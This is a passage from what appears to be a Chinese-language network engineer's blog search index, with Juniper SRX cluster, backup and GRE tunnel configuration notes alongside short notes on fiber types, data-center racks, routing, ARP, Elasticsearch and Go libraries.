priority 1 set chassis cluster redundancy-group 1 node 0 priority 100 set chassis cluster redundancy-group 1 node 1 priority 1 set chassis cluster redundancy-group 1 interface-monitor ge-0/0/3 weight 255 set chassis cluster redundancy-group 1 interface-monitor ge-0/0/4 weight 255 set chassis cluster redundancy-group 1 interface-monitor ge-0/0/5 weight 255 set chassis cluster redundancy-group 1 interface-monitor ge-3/0/3 weight 255 set chassis cluster redundancy-group 1 interface-monitor ge-3/0/4 weight 255 set chassis cluster redundancy-group 1 interface-monitor ge-3/0/5 weight 255 set chassis cluster reth-count 3 set interfaces ge-0/0/3 gigether-options redundant-parent reth0 set interfaces ge-3/0/3 gigether-options redundant-parent reth0 set interfaces reth0 redundant-ether-options redundancy-group 1 set interfaces reth0 unit 0 family inet address 192.168.3.1/24 set interfaces ge-0/0/4 gigether-options redundant-parent reth1 set interfaces ge-3/0/4 gigether-options redundant-parent reth1 set interfaces reth1 redundant-ether-options redundancy-group 1 set interfaces reth1 unit 0 family inet address 192.168.4.1/24 set interfaces ge-0/0/5 gigether-options redundant-parent reth2 set interfaces ge-3/0/5 gigether-options redundant-parent reth2 set interfaces reth2 redundant-ether-options redundancy-group 1 set interfaces reth2 unit 0 family inet address 192.168.5.1/24 set security zones security-zone trust interfaces reth0.0 set security zones security-zone untrust interfaces reth1.0 set security zones security-zone DMZ interfaces reth2.0 配置說明\nOn device A: \u0026gt;set chassis cluster cluster-id 1 node 0 reboot //定義cluster-id 和node，同一個集群cluster-id 必須相同，取值範圍為0-15，0 代表禁用集群；node 取值範圍為0-1, 0代表主設備 On device B: \u0026gt;set chassis cluster cluster-id 1 node 1 reboot //定義cluster-id 和node，同一個集群cluster-id 必須相同，取值範圍為0-15，0 代表禁用集群；node 取值範圍為0-1, 0代表主設備 On device A: set groups node0 system host-name SRX-Primary set groups node0 interfaces fxp0 unit 0 family inet address 10.10.30.189/24 set groups node1 system host-name SRX-Secondby set groups node1 interfaces fxp0 unit 0 family inet address 10.10.30.190/24 //為集群設備配置單獨的名字和管理IP 地址 set apply-groups \u0026#34;${node}\u0026#34; //讓以上的全域配置應用到每個獨立的節點上 set interfaces fab0 fabric-options member-interfaces ge-0/0/1 set interfaces fab1 fabric-options member-interfaces ge-3/0/1 //定義數據同步端口並關聯連接埠 set chassis cluster redundancy-group 0 node 0 priority 100 set chassis cluster redundancy-group 0 node 1 priority 1 set chassis cluster redundancy-group 1 node 0 priority 100 set chassis cluster redundancy-group 1 node 1 priority 1 //設置冗餘組的對不同節點的優先級，優先級範圍1-254.值越大優先級越高，一般習慣定義2 個冗餘組，redundancy-group 0 用於控制引擎，redundancy-group 1 用於控制數據引擎，當然也可以為每組冗餘連接埠放在一個redundancy-group 組中 set chassis cluster redundancy-group 1 interface-monitor ge-0/0/3 weight 255 set chassis cluster redundancy-group 1 interface-monitor ge-0/0/4 weight 255 set chassis cluster redundancy-group 1 interface-monitor ge-0/0/5 weight 255 set chassis cluster redundancy-group 1 interface-monitor ge-3/0/3 weight 255 set chassis cluster redundancy-group 1 interface-monitor ge-3/0/4 weight 255 set chassis cluster redundancy-group 1 interface-monitor ge-3/0/5 weight 255 //配置接口監控在數據冗餘口，不建議配置接口監控在redundancy-group 0，當監控到接口故障後優先級降255，實現數據口冗餘自動切換 set chassis cluster reth-count 3 //定義集群最多支持多少組冗餘接口，必須不低於當前配置的冗餘口組數目，否則將有超過數量的冗餘口不能正常工作，超過冗餘組的冗餘接口的路由訊息都不生效 set interfaces ge-0/0/3 gigether-options redundant-parent reth0 set interfaces ge-3/0/3 gigether-options redundant-parent reth0 set interfaces reth0 redundant-ether-options redundancy-group 1 //把物理連接埠加入到冗餘接口reth，並把接口reth0 加入數據冗餘組redundancy-group 1 set interfaces reth0 unit 0 family inet address 192.168.3.1/24 //為冗餘邏輯接口配置IP 地址 set interfaces ge-0/0/4 gigether-options redundant-parent reth1 set interfaces ge-3/0/4 gigether-options redundant-parent reth1 set interfaces reth1 redundant-ether-options redundancy-group 1 //把物理連接埠加入到冗餘接口reth，並把接口reth1 加入數據冗餘組redundancy-group 1 set interfaces reth1 unit 0 family inet address 192.168.4.1/24 //為冗餘邏輯接口配置IP 地址 set interfaces ge-0/0/5 gigether-options redundant-parent reth2 set interfaces ge-3/0/5 gigether-options redundant-parent reth2 set interfaces reth2 redundant-ether-options redundancy-group 1 //把物理連接埠加入到冗餘接口reth，並把接口reth2 加入數據冗餘組redundancy-group 1 set interfaces reth2 unit 0 family inet address 192.168.5.1/24 //為冗餘邏輯接口配置IP 地址 set security zones security-zone trust interfaces reth0.0 set security zones security-zone untrust interfaces reth1.0 set security zones security-zone DMZ interfaces reth2.0 //把集群的邏輯接口關聯到ZONE [Juniper] SRX 自動備份 SRX 也 support 用 tftp 或是 scp 的方式做檔案上傳\n設定有修改設定檔 commit 就自動備份\nroot@888# show system archival | display set set system archival configuration transfer-on-commit set system archival configuration archive-sites \u0026#34;ftp://帳號@192.168.88.1/路徑\u0026#34;;; password \u0026#34;ftp密碼\u0026#34; 設定有每日自動備份(1440 單位為 minute)\nroot@888# show system archival | display set set system archival configuration transfer-interval \u0026#34;1440\u0026#34; set system archival configuration archive-sites \u0026#34;ftp://帳號@192.168.88.1/路徑\u0026#34;;; password \u0026#34;ftp密碼\u0026#34; 還原備份檔案\n[edit] root@888# edit system archival configuration [edit system archival configuration] root@888# load merge ftp://username:password@192.168.88.1/888_juniper.conf.gz_20151227_185001 load complete [edit system archival configuration] ","date":"November 23, 2017","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2017/20171123-juniper/","summary":"\u003ch4 id=\"juniper-firewall-tunnel\"\u003e[Juniper Firewall] tunnel\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003eACG\u003c/em\u003e\u003c/strong\u003e\n\u003ccode\u003eicare@TWCHIJF01# show | compare rollback 4\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-diff\" data-lang=\"diff\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e[edit security policies]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     from-zone DB_12 to-zone TCT_Office { ... }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+    from-zone DB_12 to-zone JC32 {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        policy For_Backup {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            match {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+                source-address DB_10.11.12.0/24;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+                destination-address BACKUP_10.32.32.130;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+                application any;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            then {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+                permit;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e\u003c/span\u003e[edit security zones security-zone DB_12 address-book]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       address DB_10.11.12.57 { ... }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+      address DB_10.11.12.0/24 10.11.12.0/24;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e\u003c/span\u003e[edit security zones]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     security-zone ESB_15 { ... }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+    security-zone JC32 {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        address-book {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            address BACKUP_10.32.32.130 10.32.32.130/32;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        host-inbound-traffic {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            system-services {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+                ping;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        interfaces {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            gr-0/0/0.32;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e\u003c/span\u003e[edit interfaces gr-0/0/0]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+    unit 32 {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        description To_JC32_DBBackup;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        tunnel {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            source 202.168.193.128;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            destination 218.253.210.8;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        family inet {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+            address 10.32.0.101/30;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+        }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e\u003c/span\u003e[edit routing-options static]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     route 0.0.0.0/0 { ... }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+    route 10.32.32.130/32 next-hop 10.32.0.102;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eset security policies from-zone DB_12 to-zone JC32 policy For_Backup match source-address DB_10.11.12.0/24\nset security policies from-zone DB_12 to-zone JC32 policy For_Backup match destination-address BACKUP_10.32.32.130\nset security policies from-zone DB_12 to-zone JC32 policy For_Backup match application any\nset security policies from-zone DB_12 to-zone JC32 policy For_Backup then permit\nset security zones security-zone DB_12 address-book address DB_10.11.12.0/24 10.11.12.0/24\nset security zones security-zone JC32 address-book address BACKUP_10.32.32.130 10.32.32.130/32\nset security zones security-zone JC32 host-inbound-traffic system-services ping\nset security zones security-zone JC32 interfaces gr-0/0/0.32\nset interfaces gr-0/0/0 unit 32 description To_JC32_DBBackup\nset interfaces gr-0/0/0 unit 32 tunnel source 202.168.193.128\nset interfaces gr-0/0/0 unit 32 tunnel destination 218.253.210.8\nset interfaces gr-0/0/0 unit 32 family inet address 10.32.0.101/30\nset routing-options static route 10.32.32.130/32 next-hop 10.32.0.102\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eicare@TWCHIJF01\u0026gt; show configuration | compare rollback 1\u003c/code\u003e\u003c/p\u003e","tags":["Network","Firewall","Juniper"],"title":"Juniper notes"},{"categories":["Network"],"contents":"第一張網卡-藍色線\n第二張網卡-綠色線\n交換機互連-白色線\n黃、紅\nStorage 有磁碟陣列，數據交換量大，用光纖連接，使用光纖專用的交換機。\n光纖顏色：\n多模 (Multi-mode)或單模 (Single-mode)的光纖線\n單模光纖是黃色，多模光纖 50μm 或是 62.5μm 通常都是橘色。10GB 多模光纖通常是水藍色(Aqua)。\n以下是一些常見的規格區分方式。\nOS1, OS2, 9µm, 9/125 = 單模光纖 OM1, 62.5µm, 62.5/125 = 多模光纖 62.5 OM2, 50µ, 50/125 = 多模光纖 50 OM3, 10GB, 50µm, 50/125 = 多模光纖 10GB OM4, 100GB, 50µm, 50/125 = 多模光纖 100GB 光纖結構\n光纖裸纖的構成主要分為三層：\n中心：高折射率玻璃芯(芯徑一般為單模 9μm，多模 50 或 62.5μm) 。 夾層：低折射率硅玻璃包層(直徑為 125μm) 。 外層：加強用樹脂塗層(直徑為 250μm)。 光纖的種類\n一般依光波長在光纖中的傳輸模式可分為：單模態光纖和多模態光纖。 多模態光纖：中心玻璃芯(纖核)較粗(50 或 62.5μm)，外層纖殼為 125μm 可傳輸多種模代的光波長。但其模間色散較大，因而限制了傳輸信號的頻率，而隨著距離的增加會更加嚴重。例如：600MB/KM 的光纖再 2KM 時則只有 300MB 的頻寬了。因此，多模光纖傳輸的距離就比較近，一般只有幾公里的距離。 單模態光纖：中心玻璃芯較細(纖核一般為 9 或 10μm)，只能傳一種模式的光。因此，其模間色散很小，適用於遠距離通訊，但其色度色散起了主要作用，這樣單模光纖對光源的譜寬和穩定性有較高的要求，即譜寬要窄，穩定性要好。 按最佳傳輸頻率窗口分： 常規型單模光纖和色散位移型單模光纖。 常規型：光纖生產廠將光纖傳輸頻率最佳化在單一波長的光上，如 1300μm。 色散位移型：光纖生產廠將 光纖傳輸頻率最佳兩個波長的光上，如 1300μm 和 1550μm。 按折射率分佈情況分：突變型和漸變型光纖。 常用光纖規格\n單模態光纖：8/125μm、9/125μm 、10/125μm 多模態光纖：50/125，歐洲標準 62.5/125μm，美國標準工業、醫療和低速網路：100/140μm、200/230μm 塑料光纖：98/1000μm，用於汽車控制。 第一櫃-網路櫃：防火牆、CoreSwitch，線多。\nServer 風扇多，可以緊接著放，散熱也會比較好，通常放下面。\n網路設備最少隔 1U，才不會過熱，通常放上面。\n機房冷氣朝上吹，代表設備面朝這邊。\n","date":"October 24, 2017","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2017/20171024-data-center/","summary":"\u003cp\u003e第一張網卡-藍色線\u003c/p\u003e\n\u003cp\u003e第二張網卡-綠色線\u003c/p\u003e\n\u003cp\u003e交換機互連-白色線\u003c/p\u003e\n\u003cp\u003e黃、紅\u003c/p\u003e\n\u003cp\u003eStorage 有磁碟陣列，數據交換量大，用光纖連接，使用光纖專用的交換機。\u003c/p\u003e\n\u003cp\u003e光纖顏色：\u003c/p\u003e\n\u003cp\u003e多模 (Multi-mode)或單模 (Single-mode)的光纖線\u003c/p\u003e\n\u003cp\u003e單模光纖是黃色，多模光纖 50μm 或是 62.5μm 通常都是橘色。10GB 多模光纖通常是水藍色(Aqua)。\u003c/p\u003e\n\u003cp\u003e以下是一些常見的規格區分方式。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eOS1, OS2, 9µm, 9/125 = 單模光纖\u003c/li\u003e\n\u003cli\u003eOM1, 62.5µm, 62.5/125 = 多模光纖 62.5\u003c/li\u003e\n\u003cli\u003eOM2, 50µ, 50/125 = 多模光纖 50\u003c/li\u003e\n\u003cli\u003eOM3, 10GB, 50µm, 50/125 = 多模光纖 10GB\u003c/li\u003e\n\u003cli\u003eOM4, 100GB, 50µm, 50/125 = 多模光纖 100GB\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e光纖結構\u003c/p\u003e\n\u003cp\u003e光纖裸纖的構成主要分為三層：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e中心：高折射率玻璃芯(芯徑一般為單模 9μm，多模 50 或 62.5μm) 。\u003c/li\u003e\n\u003cli\u003e夾層：低折射率硅玻璃包層(直徑為 125μm) 。\u003c/li\u003e\n\u003cli\u003e外層：加強用樹脂塗層(直徑為 250μm)。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e光纖的種類\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e一般依光波長在光纖中的傳輸模式可分為：單模態光纖和多模態光纖。\n\u003col\u003e\n\u003cli\u003e多模態光纖：中心玻璃芯(纖核)較粗(50 或 62.5μm)，外層纖殼為 125μm 可傳輸多種模代的光波長。但其模間色散較大，因而限制了傳輸信號的頻率，而隨著距離的增加會更加嚴重。例如：600MB/KM 的光纖再 2KM 時則只有 300MB 的頻寬了。因此，多模光纖傳輸的距離就比較近，一般只有幾公里的距離。\u003c/li\u003e\n\u003cli\u003e單模態光纖：中心玻璃芯較細(纖核一般為 9 或 10μm)，只能傳一種模式的光。因此，其模間色散很小，適用於遠距離通訊，但其色度色散起了主要作用，這樣單模光纖對光源的譜寬和穩定性有較高的要求，即譜寬要窄，穩定性要好。\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e按最佳傳輸頻率窗口分： 常規型單模光纖和色散位移型單模光纖。\n\u003col\u003e\n\u003cli\u003e常規型：光纖生產廠將光纖傳輸頻率最佳化在單一波長的光上，如 1300μm。\u003c/li\u003e\n\u003cli\u003e色散位移型：光纖生產廠將 光纖傳輸頻率最佳兩個波長的光上，如 1300μm 和 1550μm。\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e按折射率分佈情況分：突變型和漸變型光纖。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e常用光纖規格\u003c/p\u003e","tags":["Network"],"title":"機房 notes"},{"categories":["Network"],"contents":"Router - 善於運算路由表的機器，L3 的設備。\nRouting Table\n一張網卡綁了一個 IP，天生就有了 2 筆 route，不能被改變。192.168.1.1/24 自己本身。Local route / Host route：192.168.1.1/32 整個網段。Direct route / Connect route：192.168.1.0/24 Static route 想設幾個就設幾個。 172.10.10.10/24 -\u0026gt; 192.168.1.2 2.2.2.2/26 -\u0026gt; 192.168.1.9 \u0026hellip; Default route - gateway 只有一個。 0.0.0.0/0 -\u0026gt; 192.168.1.10 小數優先 - 優先走範圍小的 route。 BGPv4 ","date":"September 16, 2017","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2017/20170916-route/","summary":"\u003cp\u003eRouter - 善於運算路由表的機器，L3 的設備。\u003c/p\u003e\n\u003cp\u003eRouting Table\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e一張網卡綁了一個 IP，天生就有了 2 筆 route，不能被改變。192.168.1.1/24\n\u003cul\u003e\n\u003cli\u003e自己本身。Local route / Host route：192.168.1.1/32\u003c/li\u003e\n\u003cli\u003e整個網段。Direct route / Connect route：192.168.1.0/24\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eStatic route 想設幾個就設幾個。\n\u003cul\u003e\n\u003cli\u003e172.10.10.10/24 -\u0026gt; 192.168.1.2\u003c/li\u003e\n\u003cli\u003e2.2.2.2/26 -\u0026gt; 192.168.1.9\u003c/li\u003e\n\u003cli\u003e\u0026hellip;\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eDefault route - gateway 只有一個。\n\u003cul\u003e\n\u003cli\u003e0.0.0.0/0 -\u0026gt; 192.168.1.10\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e小數優先 - 優先走範圍小的 route。\u003c/li\u003e\n\u003cli\u003eBGPv4\u003c/li\u003e\n\u003c/ul\u003e","tags":["Network"],"title":"Route notes"},{"categories":["Network"],"contents":"封包出去前\n對 Arp Table 找 IP 對應的 MAC 有 MAC - 封裝 無 MAC - 廣播 同網段 - OK 不同網段 - 對 Arp Table 找 Router 的 MAC 有 - OK 無 - 廣播 ","date":"September 3, 2017","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2017/20170903-arp/","summary":"\u003cp\u003e封包出去前\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e對 Arp Table 找 IP 對應的 MAC\n\u003cul\u003e\n\u003cli\u003e有 MAC - 封裝\u003c/li\u003e\n\u003cli\u003e無 MAC - 廣播\n\u003cul\u003e\n\u003cli\u003e同網段 - OK\u003c/li\u003e\n\u003cli\u003e不同網段 - 對 Arp Table 找 Router 的 MAC\n\u003cul\u003e\n\u003cli\u003e有 - OK\u003c/li\u003e\n\u003cli\u003e無 - 廣播\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","tags":["Network"],"title":"Arp notes"},{"categories":null,"contents":" Data too large [parent] Data too large, data for [\u0026lt;http_request\u0026gt;] would be [123848638/118.1mb], which is larger than the limit of [123273216/117.5mb], real usage: [120182112/114.6mb], new bytes reserved: [3666526/3.4mb]\nhttps://www.elastic.co/guide/en/elasticsearch/reference/7.14/fix-common-cluster-issues.html#circuit-breaker-errors\n","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/elasticsearch/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eData too large\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003e\u003ccode\u003e[parent] Data too large, data for [\u0026lt;http_request\u0026gt;] would be [123848638/118.1mb], which is larger than the limit of [123273216/117.5mb], real usage: [120182112/114.6mb], new bytes reserved: [3666526/3.4mb]\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.elastic.co/guide/en/elasticsearch/reference/7.14/fix-common-cluster-issues.html#circuit-breaker-errors\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.elastic.co/guide/en/elasticsearch/reference/7.14/fix-common-cluster-issues.html#circuit-breaker-errors\u003c/a\u003e\u003c/p\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Elasticsearch Notes"},{"categories":null,"contents":" Data ML https://github.com/sjwhitworth/golearn https://github.com/gorse-io/gorse https://github.com/gorgonia/gorgonia https://github.com/cdipaolo/goml https://github.com/galeone/tfgo data https://github.com/gonum/gonum https://github.com/gonum/plot https://github.com/vdobler/chart https://github.com/rocketlaunchr/dataframe-go https://github.com/cpmech/gosl https://github.com/montanaflynn/stats https://github.com/nytlabs/streamtools ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/go/libraries/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eData\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003eML\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/sjwhitworth/golearn\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/sjwhitworth/golearn\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/gorse-io/gorse\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/gorse-io/gorse\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/gorgonia/gorgonia\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/gorgonia/gorgonia\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/cdipaolo/goml\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/cdipaolo/goml\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/galeone/tfgo\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/galeone/tfgo\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003edata\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/gonum/gonum\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/gonum/gonum\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/gonum/plot\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/gonum/plot\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/vdobler/chart\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/vdobler/chart\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/rocketlaunchr/dataframe-go\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/rocketlaunchr/dataframe-go\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/cpmech/gosl\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/cpmech/gosl\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/montanaflynn/stats\" target=\"_blank\" rel=\"noopener\"\u003ehttps://github.com/montanaflynn/stats\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/nytlabs/streamtools\" target=\"_blank\" 